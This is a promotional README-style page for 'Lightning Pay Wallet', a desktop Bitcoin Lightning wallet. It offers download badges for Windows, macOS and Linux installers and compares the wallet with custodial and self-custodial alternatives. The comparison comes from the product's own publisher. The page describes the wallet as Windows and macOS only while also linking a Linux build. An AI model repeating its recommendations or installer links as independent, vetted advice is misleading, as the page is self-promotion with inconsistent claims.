<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Lightning Pay Wallet compared with other desktop Lightning wallets
Custody, platform and how the backup works decide the comparison; the interface decides almost nothing.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
Desktop Lightning wallets differ on three things that matter: whether you hold the keys, whether the wallet runs on your operating system, and what has to be true for you to recover. Lightning Pay Wallet is a non-custodial wallet for Windows and macOS that manages channels for you, which puts it in a specific place among the options below.

## How this comparison was made

The comparison uses published features of each project and the behaviour a user can observe: where the keys are, which platforms the software runs on, how a payment is made, and what the recovery story is. It does not use download counts, and it does not rank wallets on interface taste.

Two boundaries are worth stating. Features change between releases, so treat any wallet's feature list as something to check on its own site rather than something fixed by this page. And the comparison is limited to what Lightning Pay Wallet actually does today: a desktop application with local keys, a managed channel layer and payments over Lightning. Anything it does not do is not claimed for it here.

## Custodial and self-custodial wallets

The first division is custody. A self-custodial wallet creates keys on your device and keeps them there, so the balance exists independently of any company. A custodial wallet keeps the keys on its servers and shows you a balance it owes you.

Wallet of Satoshi is the clearest example of the custodial model: it is an app that holds the keys for you, which is why it is simple and why it needs no channel management. That simplicity is real, and so is the trade: the operator can freeze an account or restrict a region, and the funds are a claim rather than a holding. Custodial wallets are a reasonable place for small spending amounts and a poor place for savings.

Self-custodial options on this list include Muun, BlueWallet, Phoenix and Lightning Pay Wallet. They keep keys locally. What separates them is how much of the Lightning layer you have to run yourself.

## Desktop or mobile

Platform is the second division, and it eliminates more options than custody does. A wallet that only exists as a phone app cannot be your desktop wallet, however good it is.

Wallet of Satoshi, Muun and Phoenix are built around mobile use. BlueWallet has a desktop build alongside its mobile app. Lightning Pay Wallet is a desktop application for Windows and macOS, with the same product family offered on mobile through separate apps.

If you work at a computer and want the wallet on that computer, the shortlist is small: a desktop-capable Lightning wallet, run locally, with local keys.

## Which wallets support Lightning

A wallet supports Lightning if it can produce and pay an invoice that begins `lnbc`, which is the payment request format the network uses. That is a better test than a logo or a marketing page, because it is the actual capability rather than a claim about it.

Wallets built around on-chain Bitcoin only will show you an address, not an invoice. Sparrow is an on-chain wallet by design and does not present itself as a Lightning wallet. Multi-chain apps such as Trust Wallet, Exodus and Cake Wallet treat Bitcoin as one asset among many, and whether Lightning is offered depends on the release, so check the current build rather than a comparison table.

The same test settles the exchange question. An exchange that supports Lightning shows a Lightning option in its deposit and withdrawal screens; where the option is absent, the account is on-chain only for that asset.

## Named alternatives, briefly

Muun is a self-custodial wallet that combines on-chain and Lightning in one balance. Its distinguishing choice is that it hides the channel layer almost entirely, so a user sees one number rather than two.

BlueWallet is open source, self-custodial, and offers both a hosted-node mode and a mode where you point it at your own node. It is the option people reach for when they want to move towards running their own infrastructure without starting there.

Phoenix is self-custodial and manages channels automatically, in the same spirit as Lightning Pay Wallet: you hold the keys, the software handles liquidity. Cash App and Strike are custodial payment services with Lightning rails, not desktop wallets, and comparing them with a self-custodial desktop wallet compares two different products.

Lightning Pay Wallet's own position is: desktop, non-custodial, channels managed for you, with a card and swap layer offered as product services beside the wallet.

## What the differences add up to

For a desktop user who wants local keys and no node to operate, the field narrows to a handful of wallets, and the choice between them is mostly about how much the wallet hides and how much it shows. Muun hides the most. BlueWallet shows the most, and asks the most of you. Lightning Pay Wallet sits in the managed middle, with the card services as the additional difference.

For a phone user, Phoenix and BlueWallet are the natural comparisons, and the desktop question does not arise. For someone who wants the simplest possible app and accepts custody, a custodial app is the honest answer, and no self-custodial wallet should pretend otherwise.

## Which is the best, or the fastest?

The fastest wallet is the one that does not make you wait for a confirmation to see a payment, which every Lightning wallet manages; speed will not separate them. The best is the one whose custody model, platform and recovery story match your situation. There is no universal winner, and any page that names one is ranking a preference.

What does separate wallets is what happens when something goes wrong. A wallet that shows you a recovery phrase, documents what it restores and keeps a channel backup is a wallet you can recover from. A wallet that hides all of that behind a support form is a wallet you depend on.

That is the criterion to apply to this list as much as to any other, and it is the one the custody article takes apart: [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md).

## Where Lightning Pay Wallet is the wrong choice

It is the wrong choice if you need your wallet on a phone only, because the desktop application is the product described here. It is the wrong choice if you will not keep a written recovery phrase, because a self-custodial wallet cannot help you without one. And it is the wrong choice if you want to run your own node and control liquidity directly, because this wallet deliberately takes that away from you.

Being clear about that is more useful than a feature table. A wallet that is wrong for your case is wrong regardless of how many features it lists, and the fastest way to a bad outcome is choosing on features rather than on fit.

The product itself is described in [what Lightning Pay Wallet is and whether it is safe](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-what-it-is-and-is-it-safe.md), and the install path in [installing on Windows and macOS](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-download-windows-macos.md).

## Questions people ask

### Is Wallet of Satoshi custodial?

Yes. It holds the keys for you, which is what makes it simple and what makes it a claim on the operator rather than a self-custodial holding.

### What is the best Wallet of Satoshi alternative with on-chain support?

A self-custodial desktop wallet that also holds an on-chain balance, such as Lightning Pay Wallet, Muun or BlueWallet. The point of the switch is usually to stop depending on a custodian, so pick one whose phrase you are prepared to keep.

### Does a multi-chain wallet support Lightning?

Sometimes, and it depends on the release. Multi-chain apps add and remove networks between versions, so the reliable check is whether the current build can produce an `lnbc` invoice rather than whether a comparison site lists Lightning.

### Which wallet is the simplest on Windows?

A desktop wallet that installs without extra runtime steps, manages channels for you and needs no node. Among the options above, Lightning Pay Wallet and BlueWallet's desktop build are the two that fit that description, and they differ in how much they show you.
